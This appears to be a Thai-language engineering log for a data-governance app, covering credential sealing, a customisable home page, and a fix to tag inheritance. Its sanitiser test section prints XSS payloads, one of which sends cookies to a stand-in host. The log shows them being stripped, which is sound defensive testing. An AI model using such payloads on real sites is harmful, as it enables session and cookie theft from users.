> ถ้าจะเพิ่มอะไรที่เปิด connection ไป source ในอนาคต **ให้รับ `CredentialResolver` เข้ามา อย่าสร้างเอง**

### AO.5 ครึ่งเดียวไม่รับ

`username` มาแต่ `password` ว่าง (หรือกลับกัน) → **400** ไม่ใช่ปล่อยผ่าน

เพราะถ้าปล่อยผ่าน มันจะตกไปเข้าเส้นทาง "ใช้ ref เดิม" แปลว่า **คนเปลี่ยนชื่อ user แล้วกด Save สำเร็จ แต่ระบบยังต่อด้วย login เดิม** — หน้าจอบอกอย่าง ของจริงเป็นอีกอย่าง ฝั่ง UI ก็เขียนบอกไว้ตรงๆ ว่าเว้นว่างทั้งคู่ = เก็บของเดิม กรอกทั้งคู่ = เปลี่ยน

### AO.6 หน้าจอ — `SourcesPage.tsx`

- กล่อง **Credential** มีสวิตช์สองโหมด: **Username and password** / **Secret store** สลับโหมดแล้วล้างค่าของอีกโหมดทิ้ง (กันค่าค้างที่มองไม่เห็นถูกส่งไป)
- ปุ่ม **Test connection** อยู่ในฟอร์ม ยิง `POST /v1/sources/test` ด้วยสิ่งที่พิมพ์อยู่ **โดยยังไม่บันทึกอะไร** — endpoint นี้ admin-only และถ้าเป็นการแก้ source เดิมจะส่ง `id` ไปด้วยเพื่อให้ server เติมค่าที่ไม่ได้กรอก (รวมถึง credential ที่ seal ไว้แล้ว) ให้เอง
- ผลเทสต์ถูกล้างทิ้งทุกครั้งที่แก้ฟอร์ม — ผลลัพธ์ที่วัดกับ host เดิมแต่ยังค้างอยู่บนหน้าจอ อ่านเป็นคำรับประกันของ host ใหม่
- การ์ด source แสดงคำว่า **Stored, encrypted** แทนที่จะโชว์ `fernet:stored` ดิบๆ

### AO.7 ทดสอบกับ Postgres จริงที่ผู้ใช้ให้มา

ผู้ใช้ส่ง database จริงมาให้ทดสอบ (`<host>` · db `arakdb` · user `arak`) พร้อมสั่ง **`ห้ามยุ่งกับ db อื่น`** — สคริปต์ทั้งชุดอ่าน host/db/user/password จาก environment ไม่มีค่าไหนถูกเขียนลงไฟล์ และแตะเฉพาะ `arakdb`

**19/19 เขียว** กับ backend ที่รันอยู่จริง:

| # | เคส | ผล |
|---|---|---|
| 1 | Test ก่อน save ด้วยค่าที่พิมพ์สดๆ | ✅ `PostgreSQL 16.15` ตอบใน 331 ms |
| 2 | การ test ต้องไม่ลงทะเบียนอะไรเลย | ✅ ไม่มีแถวใหม่ |
| 3 | password ผิด | ✅ `reachable: false` |
| 4 | ข้อความ error ต้องไม่สะท้อน password กลับมา | ✅ |
| 5 | register ด้วย credential ที่พิมพ์เอง | ✅ |
| 6–8 | `create()` / `get()` / `list()` ต้องตอบ `fernet:stored` | ✅ ทั้งสาม |
| 9–10 | ไม่มี response ไหนมี password หรือ ciphertext | ✅ |
| 11 | credential ที่ seal ไว้เปิด connection ได้ | ✅ |
| 12–13 | แก้ source โดยไม่พิมพ์ password ซ้ำ แล้วยังต่อได้ | ✅ (พิสูจน์ AO.3 ข้อสุดท้าย) |
| 14–15 | ใส่ username เปล่าๆ ถูกปฏิเสธ และของเดิมไม่ถูกแตะ | ✅ 400 |
| 16 | `credentialRef` เป็น plaintext ยังถูกปฏิเสธเหมือนเดิม | ✅ 400 |
| 17 | introspect ทำงานผ่าน credential ที่ seal ไว้ | ✅ |

> introspect คืน 0 table — ตรวจซ้ำกับ `psql` แล้ว `arakdb` มีแค่ schema `public` และ **ว่างจริง** ไม่ใช่บั๊กของ introspector
>
> ⚠️ password ของ database นี้ถูกวางในแชต **ควร rotate** และตอนนี้มันถูกเก็บแบบ Fernet-sealed อยู่ใน app DB ของ dev เครื่องนี้เท่านั้น (source ชื่อ `arak-live-pg`)

### AO.8 M11 — LLM ต่อ per-user สำเร็จจริงแล้ว ไม่ใช่ "ยังไม่เริ่ม"

ตารางใน Current Progress เขียนว่า M11 `⬜ ยังไม่เริ่ม` ซึ่งเก่าไปมาก ของที่ใช้งานได้จริงตอนนี้:

- **แต่ละคนตั้ง endpoint และ key ของตัวเอง** ในหน้า Settings แล้วเลือกเองว่าจะเปิดใช้ไหม — ไม่ใช่ config ที่ส่วนกลาง (ผู้ใช้ย้ำข้อนี้: *"User เป็นคนที่ Set Endpoint และ key ของตัวเองนะ แล้วเลือกเองว่าตัวเองจะใช้หรือไม่"*)
- `llm_user_setting.base_url` + `api_key_cipher` (Fernet) · key ไม่เคยถูกส่งกลับ ตอบแค่ `hasOwnKey`
- `llm_provider.allow_personal` เป็น kill switch ระดับ deployment
- ⚠️ **`LlmResource.putUser` จงใจตัดสิทธิ์ admin ให้แก้ได้แค่ `enabled`** — `UserEdit(edit.enabled(), null, null, null, null)` ไม่มีใครเขียน gateway ของคนอื่นได้ รวมถึง PLATFORM_ADMIN **ห้ามผ่อนข้อนี้**
- ทดสอบสดผ่านแล้ว: list models ได้ 21 ตัว และ completion ผ่าน key ของ `analyst_a` เอง

เหลือของจริงสองตัวคือ **NL→SQL** และ **ร่าง policy** (ซึ่งต้องออกมาเป็น `DRAFT` เท่านั้นตาม FR-2.6)

### AO.9 ⚠️ Trade-off ที่บันทึกไว้ — `LlmGatewayUrl` ยอมให้ private range

`LlmGatewayUrl.validate()` ปฏิเสธเฉพาะ loopback / link-local / any-local และ **ยอมให้ RFC 1918** โดยตั้งใจ เพราะ gateway ของผู้ใช้เองอยู่ใน private range — ถ้าห้าม ฟีเจอร์นี้ใช้ไม่ได้เลยในองค์กรที่ต้องใช้

นี่คือ SSRF surface ที่รู้ตัว: คนที่ signed-in ตั้ง base URL ไปที่ IP ภายในได้ แล้ว server จะยิงไปให้ ตัวคุมที่มีอยู่คือ

1. ต้อง signed-in และแก้ได้เฉพาะของตัวเอง
2. `llm_provider.allow_personal` ปิดทั้ง feature ได้ทันที
3. response ไม่ได้ถูกส่งกลับดิบๆ — ผ่าน shape ของ chat completion

**ห้าม "ปรับให้ปลอดภัยขึ้น" ด้วยการไปห้าม private range** เว้นแต่ผู้ใช้สั่งเอง

### AO.10 เทสต์ที่เพิ่ม

`CredentialResolverTest` (dac-connector-source — โมดูลนี้ไม่เคยมี test มาก่อน) **11 tests**

- `fernet:` round-trip · password ที่มี `:` หลายตัวต้องไม่ถูกตัด
- resolver ที่ไม่มีกุญแจต้องบอกว่า **ไม่มี `FERNET_KEY`** ไม่ใช่บอกว่า credential เสีย (นี่คือเคสของ AO.4)
- `fernet:stored` ต้องถูกปฏิเสธ
- plaintext ที่ open ออกมาแล้วไม่มี `:` ต้องถูกปฏิเสธ ไม่ใช่เดา
- opener ที่ throw ต้องรายงานเหตุผล
- `env:` ครบทั้งเจอ/ไม่เจอ/ชื่อ scheme ที่ไม่มีใครทำ/reference ว่าง

---

---

### AO.11 — สองเรื่องที่ผู้ใช้เจอหน้า Sources หลังของขึ้น

**(1) 🐛 กด Edit source แล้วเห็น source อื่นโผล่มาข้างล่างด้วย** — แก้แล้ว (`SourcesPage.tsx`)

ฟอร์มเปิดอยู่ข้างบน แต่รายการ source ทั้งหมดยังถูก render ต่อข้างล่างเหมือนเดิม ผลคือ:

- **source ที่กำลังแก้อยู่โผล่สองที่** — ฟอร์มข้างบน กับการ์ดของตัวเองอีกใบห่างลงไปไม่กี่ร้อยพิกเซล
- **ปุ่ม Edit / Disable / Remove ของ source ตัวอื่นอยู่ในระยะเอื้อม** ระหว่างที่คนกำลังแก้อีกตัวหนึ่ง — กดพลาดแล้วฟอร์มที่พิมพ์ค้างไว้หายทันที

แก้เป็น: **ระหว่างที่ฟอร์มเปิด หน้านี้แสดงแค่ฟอร์ม** (ทั้งตอน Register และตอน Edit) รายการ + สถานะ Loading ถูกซ่อนด้วย `editing === null` หัวฟอร์มบอกอยู่แล้วว่ากำลังแก้ตัวไหน (`Edit <name>`) และปุ่ม Cancel พากลับมาที่รายการ

```tsx
{/* The form stands alone. A list underneath it repeats the source being
    edited a second time, a few hundred pixels below its own form, and
    puts every other source's Edit and Remove button within reach of
    somebody who is in the middle of changing this one. */}
{sources && sources.length > 0 && editing === null && (
```

**(2) "Connect database ใหม่ ยังไม่เห็นที่ให้กรอก password ยังเป็น Credential reference"** — ของอยู่ครบ แต่ **หน้าจอที่เปิดค้างไว้เป็น bundle เก่า**

ตรวจแล้วทุกชั้น ณ เวลาที่ถาม:

| ตรวจอะไร | ผล |
|---|---|
| `SourcesPage.tsx` ในดิสก์ | มีบล็อก Credential + ปุ่ม `Username and password` / `Secret store` ครบ |
| `dist/assets/index-*.js` | มีสตริงทั้ง `Username and password`, `Secret store`, `Stored, encrypted`, `Opens one read-only connection` |
| 8080 / 8090 / 3000 | เสิร์ฟ bundle ตัวเดียวกันหมด (hash ตรงกับดิสก์) |

**หลักฐานชิ้นที่ชี้ขาด:** ในภาพที่ส่งมา การ์ดเขียนว่า `Credential fernet:stored` — แต่โค้ดปัจจุบันไม่มีทางพิมพ์แบบนั้นได้เลย มันจะพิมพ์ **`Stored, encrypted`** (`isSealed()` ครอบไว้) แปลว่าแท็บนั้นโหลด JS ไว้ตั้งแต่ก่อน build รอบ 01:31

> **กฎที่ต้องจำ:** แก้ `frontend/app/src` แล้ว **คนใช้ยังไม่เห็นอะไรเลย** จนกว่าจะ `VITE_BASE=/Arak/ npx vite build` — และแท็บที่เปิดค้างไว้ก่อนหน้านั้นก็ยังถือ bundle เก่าอยู่จนกว่าจะรีเฟรช รอบนี้ hash เปลี่ยนเป็น `index-CUESUuy2.js` แล้ว รีโหลดหน้าเดียวก็เห็น

**อีกเคสที่หน้าตาเหมือนกันแต่ถูกต้อง:** กด Edit ใส่ source ที่ credential เป็น `env:SRC_PG_ARAK_CREDENTIAL` (เช่น `demo-pg`) ฟอร์มจะ**เปิดมาที่โหมด Secret store** ซึ่งก็คือช่อง "Credential reference" ตัวเดิม — ตั้งใจให้เป็นแบบนั้น เพราะ source นั้นชี้ vault/env อยู่จริง ถ้าจะเปลี่ยนไปพิมพ์ user/password ให้กดปุ่ม **Username and password** ที่หัวบล็อก Credential

## รอบก่อนหน้า — **หน้าแรกที่แต่ละคนจัดเอง (M12)** · **Requestor ไม่เจอ governance อีกแล้ว** · และ 🐛 **บั๊กที่ทำให้ "เซฟแล้วเหมือนไม่ติด"**

### AN.1 โจทย์จากผู้ใช้ — สองข้อที่ต่อกัน

> `หน้าแรกของ Requestor ก้ต้องไม่เห็น policy governance ต่างๆ สิ ให้เป็นหน้า Search Global Search ไปได้ไหม คล้ายๆหน้าแรกของ Openmetadata แต่เอาให้เข้า theme ของเรา`
> `หน้าแรก ตรงนี้อยากให้สามรถ Customize ได้ ตาม User / มี Object ให้เลือก มีกราฟ สามารถจัดวางได้หลายแบบ`
> `สามารถวาง Link วาง HTML, วาง Video แล้ว Render แสดงผลได้`

สองข้อนี้เป็นเรื่องเดียวกัน ถ้าหน้าแรกจัดเองได้ "หน้าแรกของ Requestor" ก็คือ **default คนละใบ** ไม่ใช่หน้าใหม่ที่ต้องเขียนแยก
เลยทำเป็นระบบเดียว: layout เก็บต่อ account · default ขึ้นกับว่า account นั้นทำหน้าที่อะไร · และ governance widget **ไม่ถูกเสนอ** ให้ account ที่ไม่ได้ governance

### AN.2 โครงที่ลงไป

| ชั้น | ไฟล์ | บรรทัด |
|---|---|---|
| Migration | `V13__home_layout.sql` | 1 แถวต่อ account · `layout jsonb` · **ไม่มีแถว = default** (ลบแถว = reset) |
| Model | `home/HomeLayout.java` | 149 |
| **Sanitiser** | `home/HomeLayoutValidator.java` | 403 |
| Store | `home/HomeLayoutStore.java` | 234 |
| REST | `resources/HomeResource.java` | 100 — `GET` / `PUT` / `DELETE /v1/home/layout` |
| API client | `frontend/app/src/api/home.ts` | 97 |
| Preset | `pages/home/presets.ts` | 89 |
| Widget catalogue | `pages/home/widgets.tsx` | 922 |
| กราฟ | `pages/home/charts.tsx` | 238 |
| Editor | `pages/home/HomeEditor.tsx` | 627 |
| หน้า | `pages/HomePage.tsx` | 267 |

**โมเดล** — layout คือ preset + รายการ widget ที่ปักไว้ว่าอยู่คอลัมน์ไหน
ลำดับในคอลัมน์ = ลำดับใน list เฉยๆ **ไม่มี field position** เพราะ field แบบนั้นจะหลุดจาก array ที่ถือมันอยู่เสมอเมื่อมีคนย้าย widget

```
Preset   SINGLE(1) · HALVES(2) · WIDE_LEFT(2) · WIDE_RIGHT(2) · THIRDS(3)
Widget   { id, type, column, title?, config }
Layout   { preset, widgets[] }
```

เลือกเป็น **preset ไม่ใช่กริดอิสระ** เพราะคนที่จัดหน้าแรกกำลังเลือก *รูปทรง* ไม่ได้เขียน CSS grid — และแปลว่าพฤติกรรมตอนจอแคบเขียนครั้งเดียวต่อ preset ไม่ใช่คำนวณจากตัวเลขที่คนพิมพ์มา

**Widget 14 ตัว** — `SEARCH` · `RECENT_POLICIES` · `GOVERNANCE_COVERAGE` · `SOURCES` · `VOCABULARY` · `PLATFORM` · กราฟ 4 ตัว (`CHART_ASSETS_BY_TYPE` / `CHART_POLICIES_BY_STATE` / `CHART_POLICIES_BY_SCOPE` / `CHART_SOURCES_BY_MODE`) · `LINKS` · `NOTE` · `HTML` · `VIDEO`

**กราฟวาด SVG เอง ไม่ลง chart library** และ **การย้าย widget ใช้ปุ่มขึ้น/ลง ไม่ลง drag-and-drop library** — เพิ่ม dependency สองตัวเพื่อฟีเจอร์เดียวไม่คุ้ม และปุ่มขึ้น/ลงคือทางเดียวที่คนใช้คีย์บอร์ดจัดหน้าได้

### AN.3 default คนละใบ และเหตุผลที่มันไม่ใช่เรื่อง security

| account | default |
|---|---|
| governance (`PLATFORM_ADMIN` / `POLICY_AUTHOR` / `DATA_OWNER` / `AUDITOR`) | `WIDE_LEFT` + 5 panel เดิมเป๊ะ — `RECENT_POLICIES`, `GOVERNANCE_COVERAGE`, `SOURCES`, `VOCABULARY`, `PLATFORM` |
| `REQUESTER` | `SINGLE` **นำด้วย `SEARCH`** · ไม่มี governance panel สักตัว |

default ของ governance ถูก pin ไว้ด้วยเทสต์ว่า **ต้องเท่ากับหน้าที่เคยมี ทั้งชนิดและคอลัมน์** — คนที่ไม่เคยเปิด editor เลยต้องดูไม่ออกว่ามันมีอยู่

> ⚠️ **การกรองนี้คือ "เมนู ไม่ใช่รั้ว"** — endpoint ที่อยู่หลัง governance panel ทุกตัว **ตอบ account ที่ล็อกอินแล้วทุกคนโดยตั้งใจ** เพราะคนที่โดนปฏิเสธข้อมูลต้องดูออกว่า policy ตัวไหนปฏิเสธเขา การหด panel ออกจากหน้าแรกไม่ได้หดสิทธิ์ใคร เขียนคำนี้ไว้ทั้งใน `HomeLayout.WidgetType#governance()` และหัวไฟล์ `HomePage.tsx` เป็นคำเดียวกับที่ navigation rail ใช้ด้วยเหตุผลเดียวกัน

ผลพลอยได้ที่ตั้งใจ: หน้าของ requester **ไม่ยิง request ที่หน้าไม่ได้ใช้** — widget ดึงข้อมูลของตัวเอง ไม่ใช่หน้าดึง 5 อย่างแล้วแจกลงมา (TanStack dedupe ด้วย query key อยู่แล้ว สอง widget ที่อ่าน endpoint เดียวกันยังยิงครั้งเดียว) มีเทสต์จับข้อนี้ตรงๆ เพราะหน้าที่กรอง markup ออกแต่ยังยิง query เบื้องหลัง **ดูถูกและผิด**

### AN.4 🐛 บั๊กจริง — "เซฟแล้วเหมือนไม่ติด"

เจอตอนยิง e2e จริงกับ backend ที่รันอยู่ ไม่ได้เจอจาก unit test

**อาการ:** `analyst_a` (REQUESTER) เพิ่ม panel `RECENT_POLICIES` แล้วกด Save → panel **โผล่ขึ้นมา** อยู่จนกด refresh แล้ว **หายไป**

**สาเหตุ** สองที่ต่อกัน:
1. `HomeResource.save` ไม่เคยส่ง role ของคนเรียกลงไปเลย
2. `HomeLayoutStore.save` คืน `clean` ดิบๆ ไม่ได้คืน `forRole(clean, …)`

และที่ทำให้มันโผล่มาให้เห็นคือฝั่งหน้าเว็บ — `HomePage.tsx` ทำ

```ts
const accept = (next) => { client.setQueryData(['home-layout'], next); setDraft(null); };
```

**หน้าเว็บวาดสิ่งที่ PUT ตอบกลับ ไม่ได้อ่านใหม่** → reply ที่ไม่ได้กรอง = panel ที่ไม่ควรมี อยู่จนกว่าจะ reload
ซึ่งสำหรับคนใช้มันอ่านออกมาเป็น **"เซฟไม่ติด"** ไม่ใช่ "panel นี้ไม่ใช่ของคุณ"

**ที่แก้:** `save()` คืน layout ที่ **กรองตาม role ของคนที่เซฟ** แต่ **แถวใน DB ยังเก็บครบ**

```java
Layout clean = validator.clean(layout);
…
return new LayoutView(forRole(clean, governanceReader), false, now, actor);
```

สองอย่างนี้ **ตั้งใจให้ไม่เหมือนกัน** — แถวเก็บครบเพื่อว่าวันที่ account นั้นได้ role เพิ่ม panel เก่ากลับมาเอง ส่วน reply ต้องเท่ากับหน้าที่จะได้ตอน reload พอดี

> เทสต์ที่ปักเรื่องนี้ไว้คือ `HomeLayoutStoreIT` (Testcontainers, 6 เทสต์) — ทั้ง `saveIsFilteredForTheCaller` (reply กรองแล้ว **และ** อ่านซ้ำต้องได้เท่ากัน) และ `theStoredRowIsNotFiltered` (อ่านแถวเดิมด้วยสายตา governance ต้องเห็นครบ) เพราะถ้าเขียนแต่ unit test ของตัวกรอง บั๊กนี้มองไม่เห็นเลย

### AN.5 HTML ที่คนพิมพ์เอง = stored XSS — `HomeLayoutValidator`

ข้อ `สามารถวาง Link วาง HTML, วาง Video แล้ว Render` แปลว่ามี **markup ที่คนพิมพ์ ถูก render กลับเข้า session ของคนที่อ่าน** ซึ่งใน product นี้คือช่องเดียวที่ markup กลายเป็นสิทธิ์ — script ที่ยิงจาก dashboard จะวิ่งด้วยสิทธิ์ของคนอ่านไปหา policy API

กติกาที่บังคับ (ทุกอย่างอยู่ใน `HomeLayoutValidator` และ **ทำความสะอาดทั้งตอนเขียนและตอนอ่าน**):

| config | รูปร่างที่ยอม |
|---|---|
| `HTML` | `{html}` — jsoup `Safelist.basicWithImages()` + heading + table · เพดาน **20,000 ตัวอักษร** |
| `NOTE` | `{text}` เพดาน 4,000 |
| `LINKS` | `{links:[{label,url,note?}]}` สูงสุด 12 · URL เพดาน 2,000 |
| `VIDEO` | `{url, kind:'EMBED'\|'FILE', caption?}` — **allowlist: YouTube / Vimeo หรือไฟล์ตรง `.mp4`/`.webm`/`.ogg`** |
| กราฟ 4 ตัว | `{shape:'DONUT'\|'BARS'}` |
| `RECENT_POLICIES` / `SOURCES` | `{limit}` หนีบไว้ที่ 3..12 |
| ที่เหลือ | `{}` |

เพดานอื่น: widget สูงสุด 24 · title 80 ตัวอักษร · **ทุกการปฏิเสธตอบ HTTP 400** (ไม่ใช่ 422)

> หมายเหตุที่เขียนคอมเมนต์ไว้ใน code แล้วและอย่าไปแก้: **เพดาน 20,000 ตัด "ก่อน" jsoup ทำงาน** — jsoup pretty-print ใส่ newline ต่อ element ทำให้สตริงที่เก็บจริงยาวกว่าเพดานได้ ~12% ตัดทีหลังจะได้ HTML ที่ขาดกลางแท็ก

### AN.6 ยิงจริงกับ backend ที่รันอยู่ — 40 เคส

เขียน `home_e2e.py` ยิง `PUT/GET/DELETE /api/v1/home/layout` ด้วย token จริงของ `analyst_a` และ `admin` (ไฟล์อยู่ใน scratchpad ไม่ได้ commit)

ผลหลังแก้บั๊ก **ผ่านครบ 40** รวมของที่ตั้งใจยิงให้พัง:

```
<p onclick="steal()">hi</p><script>alert(1)</script>
<img src=x onerror="fetch('//evil.test?c='+document.cookie)">
<a href="javascript:alert(2)">click</a><iframe src="//evil.test"></iframe>
```

กลับมาเป็น

```
<p>hi</p><img><a rel="nofollow noopener noreferrer" target="_blank">click</a>
```

และ **แถวใน DB ก็สะอาด** — `HomeLayoutStoreIT.hostileHtmlNeverReachesTheDatabase` อ่าน `SELECT layout::text FROM home_layout` ดิบๆ เพื่อพิสูจน์ข้อนี้ เพราะ sanitiser ที่ล้างแต่ขาออกจะทิ้ง payload ไว้ใน DB ให้ของที่อ่านทีหลัง (report, export, endpoint ในอนาคต) ไปเจอ

เคสอื่นที่ยืนยันแล้ว: preset มั่ว / widget type มั่ว / widget เกิน 24 / `javascript:` ใน link / video host นอก allowlist → **400 ทั้งหมด** · title ยาวเกิน / id ซ้ำ / column นอกช่วง / link เกิน 12 / URL ยาวเกิน → **หนีบให้** · ไม่มี token → **401** · page ของคนหนึ่งไม่ใช่ของอีกคน · `DELETE` คืน default

### AN.7 สิ่งที่ยัง "เหมือนเดิม" โดยตั้งใจ

5 panel เดิมถูก **ยกข้ามมาทั้งดุ้น** ไม่ได้เขียนใหม่ให้ใกล้เคียง — markup เดิมเป๊ะ
banner ด้านบนเปลี่ยนเฉพาะ **ปุ่ม** ให้ตรงกับ account: คนที่เขียน policy ไม่ได้ เคยโดนยื่นปุ่ม `New policy` เป็น action หลัก ซึ่งเป็นปุ่มที่มีไว้ปฏิเสธเขา — ตอนนี้เป็น `Explore the catalog` / `Run a query`

### AN.8 เทสต์

| ชุด | จำนวน |
|---|---|
| `HomeLayoutValidatorTest` | 305 บรรทัด |
| `HomeLayoutStoreTest` | 7 |
| **`HomeLayoutStoreIT`** (Testcontainers) | **6 — ใหม่รอบนี้** |
| `pages/home/layout.test.ts` | 12 |
| `pages/HomePage.test.tsx` | 9 |

---

## รอบก่อนหน้า — 🐛 **ARAK แต่ง metadata ที่ OpenMetadata ไม่มี** — Column Tag เยอะเกินจริง เพราะเรา "ตกทอด" tag ลง column เอง

### AM.1 ผู้ใช้ทักว่า Column Tag ใน ARAK ไม่ตรงกับ OpenMetadata

ผู้ใช้เปิด table `customers` ใน OpenMetadata เทียบกับ ARAK แล้วถามว่า

> `Column Tag ไม่เห็นจะตรงกับที่เห็นใน Arak เลย`
> `ทำไม Column Tag เยอะแยะไปหมด ใน Arak ผิดหรือเปล่า Recheck ให้ดีนะ ตอน ingest ทำงานถูกไหม`

ใน OpenMetadata tab Columns ของ `customers` มี **3 column และ 1 tag ต่อ column พอดี**

| column | tag ใน OpenMetadata |
|---|---|
| `created_at` | `PII.NonSensitive` |
| `id` | `PII.NonSensitive` |
| `name` | `MFEC-PDPA.Sentitive (ข้อมูลส่วนบุคคลอ่อนไหว)` |

ใน ARAK column เดียวกันมีชิปเต็มแถว รวมทั้ง `PII.Sensitive` บน `name` ทั้งที่ OpenMetadata บอกว่า `name` เป็น `MFEC-PDPA` ไม่ใช่ `PII`

#### ตรวจก่อนแก้ — **ingest ไม่ได้ผิด**

ไล่ดูที่ตารางจริงก่อน ไม่เดา:

```bash
MSYS_NO_PATHCONV=1 docker exec dac-appdb psql -U dac -d dac -c "
select target_fqn, facet_type, facet_fqn, depth, is_direct, coalesce(inherited_from,'-')
from asset_facet
where target_fqn like 'dtp-iprm.iprm.public.customers.%'"
```

ได้ **39 แถว** — แต่ในนั้นมี `is_direct = true` อยู่ **3 แถวพอดี** และตรงกับหน้าจอ OpenMetadata ทีละตัว
ที่เหลืออีก 36 แถวคือของที่ **ARAK คิดขึ้นเอง** ไม่ใช่ของที่ดูดมาผิด

> **สรุปให้ผู้ใช้:** การ ingest ถูกต้อง 100% — เก็บมา 3 column, 3 tag ตรงตามต้นทาง ปัญหาอยู่ที่ชั้นคำนวณหลัง ingest

### AM.2 คำถามที่ตามมา และเป็นคำถามที่ถูกต้อง

> `Inherit นี่มันมีด้วยหรอใน Openmetdata ถ้าไม่มี ทำไมต้อง Inherit ด้วยอะ metadata`

คำตอบตรงๆ: **OpenMetadata inherit แค่บางอย่าง ไม่ได้ inherit ทุกอย่าง**

| facet | OpenMetadata ตกทอดลงชั้นล่างไหม |
|---|---|
| **Domain** | ✅ ตกทอด service → database → schema → table |
| **Owners** | ✅ ตกทอด |
| Classification tag | ❌ **ไม่** — tag ผูกกับ entity ที่คนไปติดเท่านั้น |
| Glossary term | ❌ ไม่ |
| Tier / Certification | ❌ ไม่ |

ARAK ไปตกทอด **ทุก facet** ลง column ตาม FR-2A.1 ซึ่งเขียนไว้กว้างเกินจริง → กลายเป็นการ **แต่ง metadata ที่ต้นทางไม่มี**

#### และมันไม่ใช่แค่เรื่องรก — เป็นบั๊กความถูกต้องของ policy

data policy ที่เขียนว่า

```
mask ทุก column ที่  tags contains 'PII'
```

เมื่อ table ติด `PII.Sensitive` ไว้ **ทุก column ของ table นั้นจะ match** → ติด tag ที่ table หนึ่งครั้ง เท่ากับ **null ทั้งตาราง** โดยไม่มีใครตั้งใจ
`created_at` กับ `id` ที่ steward จงใจติด `PII.NonSensitive` ไว้ ก็ยังโดน mask เพราะมันรับ `PII.Sensitive` ของ table มาด้วย

### AM.3 วิธีแก้ — จำกัดให้เหลือเท่าที่ OpenMetadata ทำจริง

`FacetInheritance.effective(...)` เพิ่ม allow-list แล้วกรองที่ต้นทาง

```java
/**
 * The facet types that cross from one asset to the one below it.
 *
 * <p>Chosen to match OpenMetadata's behaviour rather than to be generous. ...
 */
private static final Set<FacetType> INHERITABLE =
    EnumSet.of(
        FacetType.DOMAINS,
        FacetType.DATA_PRODUCTS,
        FacetType.OWNERS,
        FacetType.CUSTOM_PROPERTY);
```

```java
for (ExtractedFacet facet : level.facets()) {
  if (!INHERITABLE.contains(facet.facetType())) {
    continue;
  }
  ...
}
```

**ทำไมเก็บ `CUSTOM_PROPERTY` ไว้ ทั้งที่ OpenMetadata ไม่ตกทอด** — เพราะ OpenMetadata นิยาม custom property ต่อ entity type และ **column ถือ custom property ไม่ได้เลย** ถ้าไม่ตกทอด expression

```
user.country == asset.prop('dataResidency')
```

จะเขียนที่ระดับ column ไม่ได้ตลอดกาล (FR-2A.4) — และ `AssetContextLoader` อ่าน `asset_facet` ด้วย `target_fqn` ตรงๆ **ไม่มี fallback จาก column ขึ้นไปหา table** จึงต้องตกทอดไว้

#### ⚠️ ของที่ **ไม่ได้** แตะ — tag ancestor ยังกางเหมือนเดิม

อย่าสับสนสองอย่างนี้ ทั้งคู่สร้างแถวที่ `is_direct = false` เหมือนกัน:

| | ตัวอย่าง | `inherited_from` | สถานะ |
|---|---|---|---|
| **tag ancestor** (`FacetExtractor.ancestorsOf`) | `PII.NonSensitive` ⇒ `PII` depth 1 | `NULL` | **คงไว้** — คือประโยคเดิมอ่านหยาบลง และ selector `classifications contains 'PII'` พึ่งมัน (FR-2A.2) |
| **parent→child inheritance** (`FacetInheritance.effective`) | tag ของ table ⇒ ทุก column | `<fqn ของชั้นบน>` | **จำกัดแล้ว** |

#### ลบ dead code ที่ตามมา

เมื่อไม่มี facet ตระกูล tag เหลือใน `INHERITABLE` แล้ว กลไก mutual-exclusion (`blockedByOverride`, `exclusiveRootsHeldBy`, set `settled`) **วิ่งไม่ถึงอีกต่อไป** → ลบทิ้ง ไม่ทิ้งไว้ให้คนอ่านหลงว่ายังทำงาน
พารามิเตอร์ `mutuallyExclusiveRoots` ยังรับไว้ (ผู้เรียกส่งมา) แต่ javadoc ระบุชัดว่าไม่ได้ใช้แล้วและทำไม

> **หมายเหตุ:** อันนี้ **ต่างจากแผน FR-2A.1** ที่เขียนว่า "union ของที่ผูกตรง + ที่ตกทอดมาจากชั้นบน" ทำตามคำสั่งผู้ใช้ที่ว่าอย่าไปแต่ง metadata ที่ต้นทางไม่มี — ถ้าจะกลับ แก้ที่ `INHERITABLE` บรรทัดเดียว

### AM.4 ฝั่งหน้าจอ — column row ไม่ต้องพูดซ้ำสิ่งที่ table พูดไปแล้ว

หลังแก้ backend column ยังเหลือชิปอยู่ 8 ตัว เพราะหน้า Columns วาด facet **ทุกแถว** ที่ถึง column รวม domain 3 ชั้นกับ owner 2 คนของ table ซ้ำทุกบรรทัด — ตาราง 352 column ก็คือพูดเรื่องเดิม 352 รอบ

เพิ่ม `columnFacets()` ใน `facets.tsx`

```ts
export function columnFacets(facets: FacetRow[]): FacetRow[] {
  return listFacets(facets.filter((facet) => !facet.inheritedFrom));
}
```

- `!facet.inheritedFrom` → ตัดของที่รับมาจาก table (table วาดไว้แล้วข้างบน)
- `listFacets()` → ม้วน ancestor ที่ materialize ไว้ (`PII.NonSensitive` ไม่ต้องมี `PII` เปล่าๆ ต่อท้าย) และตัด `classifications` / `tier` ที่ซ้ำกับ tag

subtitle เปลี่ยนจาก `N carrying a facet` เป็น `N carrying governance of their own` เพราะตัวเลขเปลี่ยนความหมายไปแล้ว

### AM.5 ผลจริงหลังแก้ — ตรงกับ OpenMetadata ทีละตัว

re-crawl แล้วอ่านทั้ง DB และ API:

```
created_at -> ['PII.NonSensitive', 'PII']
id         -> ['PII.NonSensitive', 'PII']
name       -> ['MFEC-PDPA.Sentitive (ข้อมูลส่วนบุคคลอ่อนไหว)', 'MFEC-PDPA']
```

- **39 แถว → 24 แถว** ที่ระดับ column
- `PII.Sensitive` กับ `Tier.Tier2` ของ table **ไม่ไหลลง column อีกแล้ว**
- ที่เหลือคู่กับ tag ของตัวเองคือ ancestor ของ tag ตัวนั้นเอง (`PII`, `MFEC-PDPA`) ซึ่งคงไว้ให้ selector — และหน้าจอม้วนทิ้ง เหลือ **ชิปเดียวต่อ column ตรงกับ OpenMetadata**

### AM.6 เทสต์ที่เขียนใหม่

`FacetInheritanceTest` เขียนใหม่ทั้งไฟล์ แบ่ง `@Nested` 2 ก้อนตามสัญญา 2 ข้อ:

| `Inherited` — *ที่ OM ตกทอด เราตกทอด* | `NotInherited` — *ที่ OM ไม่ตกทอด เราไม่แต่งขึ้น* |
|---|---|
| `inheritsDownwards` | `tagsDoNotDescend` |
| `namesTheSource` | `ownColumnTagSurvivesAlone` |
| `nearestAncestorWins` | `theRestOfTheTagFamilyStaysPut` (TIER + CLASSIFICATIONS + TERMS) |
| `ownRowWins` | `tagsDoNotDescendBetweenAssets` |
| `customPropertiesReachColumns` | |

